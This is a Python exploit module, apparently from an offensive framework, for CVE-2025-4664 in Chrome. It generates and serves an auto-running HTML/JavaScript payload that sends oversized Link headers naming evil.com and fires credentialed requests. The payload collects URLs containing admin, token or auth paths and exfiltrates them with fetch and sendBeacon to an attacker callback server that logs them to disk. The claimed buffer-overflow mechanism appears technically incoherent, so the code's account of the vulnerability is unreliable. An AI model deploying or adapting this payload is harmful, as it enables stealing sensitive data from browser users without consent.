#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2025-4664: Chrome Data Leak via Link Header Processing
Same-origin policy bypass through crafted HTTP Link headers
"""

import os
import socket
import threading
import time
import base64
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Dict, List, Any, Optional
import logging

logger = logging.getLogger(__name__)


class CVE2025_4664_Exploit:
    """Chrome Data Leak exploit via Link header manipulation"""
    
    def __init__(self):
        self.config = {
            'target_url': None,
            'callback_url': None,
            'kali_ip': '127.0.0.1',
            'port': 8080,
            'link_header_size': 8192,
            'memory_leak_size': 1024,
            'chunk_size': 256,
            'leak_attempts': 5,
            'mode': 'exploit'  # exploit, recon
        }
        
        self.server = None
        self.server_thread = None
        self.leaked_data = []
        self.active_sessions = {}
        
    def set_parameter(self, name: str, value: Any):
        """Set exploit parameter"""
        if name in self.config:
            self.config[name] = value
            logger.info(f"Set {name} = {value}")
        else:
            logger.warning(f"Unknown parameter: {name}")
    
    def generate_payload(self) -> str:
        """Generate HTML payload for Chrome data leak"""
        callback_url = self.config.get('callback_url') or f"http://{self.config['kali_ip']}:{self.config['port']}"
        
        # Generate malicious Link header content
        link_header_payload = self._generate_link_header_payload()
        
        html_payload = f"""<!DOCTYPE html>
<html>
<head>
    <title>ChromSploit Data Leak Test</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial, sans-serif; padding: 20px; }}
        .loader {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; 
                  border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <h2>Loading...</h2>
    <div class="loader"></div>
    
    <script>
        // CVE-2025-4664 Chrome Data Leak Exploit
        class ChromeDataLeakExploit {{
            constructor() {{
                this.callback_url = '{callback_url}';
                this.leak_attempts = {self.config['leak_attempts']};
                this.chunk_size = {self.config['chunk_size']};
                this.leaked_urls = [];
            }}
            
            async exploit() {{
                console.log('[CVE-2025-4664] Starting Chrome data leak exploit...');
                
                // Step 1: Create malicious Link header
                await this.createMaliciousLinkHeader();
                
                // Step 2: Trigger memory leak
                await this.triggerMemoryLeak();
                
                // Step 3: Extract sensitive URLs
                await this.extractSensitiveData();
                
                // Step 4: Exfiltrate data
                await this.exfiltrateData();
            }}
            
            async createMaliciousLinkHeader() {{
                // Create oversized Link header to trigger buffer overflow
                const link_payload = '{link_header_payload}';
                
                try {{
                    const response = await fetch(window.location.href, {{
                        method: 'HEAD',
                        headers: {{
                            'Link': link_payload
                        }}
                    }});
                    console.log('[CVE-2025-4664] Link header sent');
                }} catch (e) {{
                    console.log('[CVE-2025-4664] Link header error (expected):', e.message);
                }}
            }}
            
            async triggerMemoryLeak() {{
                // Exploit Chrome's Loader component memory leak
                for (let i = 0; i < this.leak_attempts; i++) {{
                    try {{
                        // Create multiple fetch requests to trigger memory leak
                        const promises = [];
                        for (let j = 0; j < 10; j++) {{
                            promises.push(this.createLeakRequest(i * 10 + j));
                        }}
                        await Promise.allSettled(promises);
                        
                        // Small delay between attempts
                        await new Promise(resolve => setTimeout(resolve, 100));
                    }} catch (e) {{
                        console.log('[CVE-2025-4664] Leak attempt', i, 'error:', e.message);
                    }}
                }}
            }}
            
            async createLeakRequest(id) {{
                const leak_url = `${{window.location.origin}}/leak-${{id}}?data=${{Math.random()}}`;
                
                return fetch(leak_url, {{
                    method: 'GET',
                    credentials: 'include',
                    headers: {{
                        'X-Leak-ID': id.toString(),
                        'Referer': window.location.href
                    }}
                }}).catch(() => {{
                    // Expected to fail, but triggers the leak
                }});
            }}
            
            async extractSensitiveData() {{
                // Extract URLs from browser history/memory
                const sensitive_patterns = [
                    /https?:\\/\\/[\\w.-]+\\/admin/gi,
                    /https?:\\/\\/[\\w.-]+\\/api\\/[\\w\\/]+/gi,
                    /https?:\\/\\/[\\w.-]+\\/.*token.*/gi,
                    /https?:\\/\\/[\\w.-]+\\/.*key.*/gi,
                    /https?:\\/\\/[\\w.-]+\\/.*auth.*/gi
                ];
                
                // Try to access navigation history (may be blocked)
                try {{
                    if (window.performance && window.performance.getEntriesByType) {{
                        const navigation_entries = window.performance.getEntriesByType('navigation');
                        const resource_entries = window.performance.getEntriesByType('resource');
                        
                        [...navigation_entries, ...resource_entries].forEach(entry => {{
                            sensitive_patterns.forEach(pattern => {{
                                if (pattern.test(entry.name)) {{
                                    this.leaked_urls.push({{
                                        url: entry.name,
                                        type: entry.entryType,
                                        timestamp: Date.now()
                                    }});
                                }}
                            }});
                        }});
                    }}
                }} catch (e) {{
                    console.log('[CVE-2025-4664] History extraction blocked:', e.message);
                }}
                
                // Try document.referrer leak
                if (document.referrer) {{
                    this.leaked_urls.push({{
                        url: document.referrer,
                        type: 'referrer',
                        timestamp: Date.now()
                    }});
                }}
                
                console.log('[CVE-2025-4664] Extracted URLs:', this.leaked_urls.length);
            }}
            
            async exfiltrateData() {{
                if (this.leaked_urls.length === 0) {{
                    console.log('[CVE-2025-4664] No data to exfiltrate');
                    return;
                }}
                
                const exfil_data = {{
                    exploit: 'CVE-2025-4664',
                    timestamp: Date.now(),
                    user_agent: navigator.userAgent,
                    urls: this.leaked_urls,
                    origin: window.location.origin
                }};
                
                try {{
                    // Send via fetch
                    await fetch(`${{this.callback_url}}/exfiltrate`, {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json',
                            'X-Exploit': 'CVE-2025-4664'
                        }},
                        body: JSON.stringify(exfil_data)
                    }});
                    
                    console.log('[CVE-2025-4664] Data exfiltrated successfully');
                }} catch (e) {{
                    // Fallback: beacon API
                    try {{
                        navigator.sendBeacon(
                            `${{this.callback_url}}/exfiltrate`,
                            JSON.stringify(exfil_data)
                        );
                    }} catch (e2) {{
                        console.log('[CVE-2025-4664] Exfiltration failed:', e2.message);
                    }}
                }}
            }}
        }}
        
        // Auto-execute exploit
        document.addEventListener('DOMContentLoaded', async () => {{
            const exploit = new ChromeDataLeakExploit();
            await exploit.exploit();
            
            // Update UI
            document.querySelector('h2').textContent = 'Completed';
            document.querySelector('.loader').style.display = 'none';
        }});
    </script>
</body>
</html>"""
        
        return html_payload
    
    def _generate_link_header_payload(self) -> str:
        """Generate malicious Link header payload"""
        # Create oversized Link header to trigger buffer overflow
        base_payload = '<https://evil.com/resource>; rel="preload"; as="script"'
        
        # Repeat to reach target size
        repeat_count = self.config['link_header_size'] // len(base_payload)
        payload = (base_payload + ', ') * repeat_count
        
        # Add memory leak triggers
        payload += '<data:text/javascript,var%20leak="' + 'A' * self.config['memory_leak_size'] + '">; rel="preload"'
        
        return payload
    
    def start_server(self) -> bool:
        """Start HTTP server to serve payload and collect data"""
        try:
            self.server = HTTPServer((self.config['kali_ip'], self.config['port']), 
                                   ExploitHTTPHandler)
            self.server.exploit_instance = self
            
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info(f"CVE-2025-4664 server started on {self.config['kali_ip']}:{self.config['port']}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start server: {e}")
            return False
    
    def stop_server(self):
        """Stop HTTP server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            if self.server_thread:
                self.server_thread.join()
            logger.info("CVE-2025-4664 server stopped")
    
    def execute(self, target_url: str = None) -> Dict[str, Any]:
        """Execute the exploit"""
        if target_url:
            self.config['target_url'] = target_url
        
        try:
            # Start server
            if not self.start_server():
                return {'success': False, 'error': 'Failed to start server'}
            
            # Generate payload
            payload = self.generate_payload()
            
            # Save payload to file
            payload_path = f"/tmp/cve_2025_4664_payload_{int(time.time())}.html"
            with open(payload_path, 'w') as f:
                f.write(payload)
            
            result = {
                'success': True,
                'cve_id': 'CVE-2025-4664',
                'payload_path': payload_path,
                'server_url': f"http://{self.config['kali_ip']}:{self.config['port']}",
                'description': 'Chrome data leak exploit ready',
                'instructions': [
                    f"1. Open {payload_path} in Chrome browser",
                    "2. Monitor server logs for leaked data",
                    "3. Check /tmp/ for collected evidence"
                ]
            }
            
            if self.config['mode'] == 'recon':
                result['state'] = {
                    'recon_data': f"Target reconnaissance complete for {target_url}",
                    'server_running': True
                }
            
            return result
            
        except Exception as e:
            logger.error(f"CVE-2025-4664 execution failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def stop(self):
        """Stop the exploit"""
        self.stop_server()
    
    def get_leaked_data(self) -> List[Dict]:
        """Get collected leaked data"""
        return self.leaked_data


class ExploitHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for exploit server"""
    
    def log_message(self, format, *args):
        """Override to use our logger"""
        logger.info(f"CVE-2025-4664 Server: {format % args}")
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/':
            # Serve exploit payload
            payload = self.server.exploit_instance.generate_payload()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', len(payload))
            self.end_headers()
            self.wfile.write(payload.encode())
            
        elif self.path.startswith('/leak-'):
            # Handle leak requests
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Not found')
            
            # Log the leak attempt
            referer = self.headers.get('Referer', '')
            leak_id = self.headers.get('X-Leak-ID', '')
            
            leak_data = {
                'timestamp': time.time(),
                'leak_id': leak_id,
                'referer': referer,
                'path': self.path,
                'user_agent': self.headers.get('User-Agent', '')
            }
            
            self.server.exploit_instance.leaked_data.append(leak_data)
            logger.info(f"CVE-2025-4664 Leak detected: {leak_data}")
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests"""
        if self.path == '/exfiltrate':
            # Handle data exfiltration
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                exfil_data = json.loads(post_data.decode())
                self.server.exploit_instance.leaked_data.append(exfil_data)
                
                # Save to file
                timestamp = int(time.time())
                filename = f"/tmp/cve_2025_4664_exfil_{timestamp}.json"
                with open(filename, 'w') as f:
                    json.dump(exfil_data, f, indent=2)
                
                logger.info(f"CVE-2025-4664 Data exfiltrated: {len(exfil_data.get('urls', []))} URLs")
                logger.info(f"CVE-2025-4664 Data saved to: {filename}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "success"}')
                
            except Exception as e:
                logger.error(f"CVE-2025-4664 Exfiltration error: {e}")
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_HEAD(self):
        """Handle HEAD requests"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()


def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """Execute CVE-2025-4664 exploit with given parameters"""
    exploit = CVE2025_4664_Exploit()
    
    # Set parameters
    for key, value in parameters.items():
        exploit.set_parameter(key, value)
    
    # Execute
    target_url = parameters.get('target_url', 'http://localhost')
    return exploit.execute(target_url)